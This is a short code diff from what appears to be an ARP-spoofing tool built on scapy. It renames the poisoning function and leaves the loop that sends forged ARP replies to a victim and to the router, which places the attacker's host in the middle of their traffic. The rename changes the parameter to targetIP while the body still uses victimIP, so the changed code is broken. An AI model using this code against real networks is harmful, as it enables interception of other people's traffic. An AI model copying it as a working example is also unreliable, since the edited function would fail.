@@ -29,7 +29,7 @@ def getRouterIP():
     return re.sub('[\(\)\{\}<>]', '', routerIP)
 
 
-def poison(victimIP):
+def ArpPoison(targetIP):
     routerIP = getRouterIP()
     routerMAC = getMacAddrFromIP(routerIP)
     victimMAC = getMacAddrFromIP(victimIP)
@@ -41,6 +41,7 @@ def poison(victimIP):
         sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
         sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
         sleep(2)
+
 
 def main():
     exit("Please run spoof.py")
